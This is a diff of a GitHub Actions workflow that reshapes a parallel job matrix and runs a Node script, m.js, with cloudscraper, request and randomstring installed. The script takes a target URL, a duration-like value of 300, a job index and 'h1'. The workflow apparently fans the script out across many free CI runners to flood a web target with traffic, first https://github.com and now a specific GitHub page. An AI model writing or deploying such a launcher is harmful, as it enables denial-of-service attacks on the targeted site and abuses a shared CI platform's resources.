@@ -1,137 +1,25 @@
-name: Run Parallel Jobs - All OS Types
+name: Linux ARM64 Parallel Jobs
 on:
   workflow_dispatch:
   push:
     branches: [ main ]
-  pull_request:
-    branches: [ main ]
 
 jobs:
-  parallel-execution:
+  linux-arm64:
     runs-on: ${{ matrix.runner }}
     strategy:
       matrix:
-        include:
-          # Linux x64 - 10 jobs each
-          - runner: ubuntu-latest
-            node-index: 1
-          - runner: ubuntu-latest
-            node-index: 2
-          - runner: ubuntu-latest
-            node-index: 3
-          - runner: ubuntu-latest
-            node-index: 4
-          - runner: ubuntu-latest
-            node-index: 5
-          - runner: ubuntu-latest
-            node-index: 6
-          - runner: ubuntu-latest
-            node-index: 7
-          - runner: ubuntu-latest
-            node-index: 8
-          - runner: ubuntu-latest
-            node-index: 9
-          - runner: ubuntu-latest
-            node-index: 10
-          
-          - runner: ubuntu-24.04
-            node-index: 1
-          - runner: ubuntu-24.04
-            node-index: 2
-          - runner: ubuntu-24.04
-            node-index: 3
-          - runner: ubuntu-24.04
-            node-index: 4
-          - runner: ubuntu-24.04
-            node-index: 5
-          - runner: ubuntu-24.04
-            node-index: 6
-          - runner: ubuntu-24.04
-            node-index: 7
-          - runner: ubuntu-24.04
-            node-index: 8
-          - runner: ubuntu-24.04
-            node-index: 9
-          - runner: ubuntu-24.04
-            node-index: 10
-          
-          - runner: ubuntu-22.04
-            node-index: 1
-          - runner: ubuntu-22.04
-            node-index: 2
-          - runner: ubuntu-22.04
-            node-index: 3
-          - runner: ubuntu-22.04
-            node-index: 4
-          - runner: ubuntu-22.04
-            node-index: 5
-          - runner: ubuntu-22.04
-            node-index: 6
-          - runner: ubuntu-22.04
-            node-index: 7
-          - runner: ubuntu-22.04
-            node-index: 8
-          - runner: ubuntu-22.04
-            node-index: 9
-          - runner: ubuntu-22.04
-            node-index: 10
-          
-          # Linux ARM64 - 10 jobs each
-          - runner: ubuntu-24.04-arm
-            node-index: 1
-          - runner: ubuntu-24.04-arm
-            node-index: 2
-          - runner: ubuntu-24.04-arm
-            node-index: 3
-          - runner: ubuntu-24.04-arm
-            node-index: 4
-          - runner: ubuntu-24.04-arm
-            node-index: 5
-          - runner: ubuntu-24.04-arm
-            node-index: 6
-          - runner: ubuntu-24.04-arm
-            node-index: 7
-          - runner: ubuntu-24.04-arm
-            node-index: 8
-          - runner: ubuntu-24.04-arm
-            node-index: 9
-          - runner: ubuntu-24.04-arm
-            node-index: 10
-          
-          - runner: ubuntu-22.04-arm
-            node-index: 1
-          - runner: ubuntu-22.04-arm
-            node-index: 2
-          - runner: ubuntu-22.04-arm
-            node-index: 3
-          - runner: ubuntu-22.04-arm
-            node-index: 4
-          - runner: ubuntu-22.04-arm
-            node-index: 5
-          - runner: ubuntu-22.04-arm
-            node-index: 6
-          - runner: ubuntu-22.04-arm
-            node-index: 7
-          - runner: ubuntu-22.04-arm
-            node-index: 8
-          - runner: ubuntu-22.04-arm
-            node-index: 9
-          - runner: ubuntu-22.04-arm
-            node-index: 10
+        runner: [ubuntu-24.04-arm, ubuntu-22.04-arm]
+        node-index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
 
     steps:
       - name: Checkout code
         uses: actions/checkout@v4
-        
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
           node-version: '20'
-          
       - name: Install dependencies
-        run: |
-          npm install cloudscraper request randomstring
-          
-      - name: Run Node script with parameters
-        run: |
-          node m.js https://github.com 300 ${{ matrix.node-index }} h1
+        run: npm install cloudscraper request randomstring
+      - name: Run Node script
+        run: node m.js https://github.com/vrbrh921-glitch/Bdbs/edit/main/.github/workflows/main.yml 300 ${{ matrix.node-index }} h1
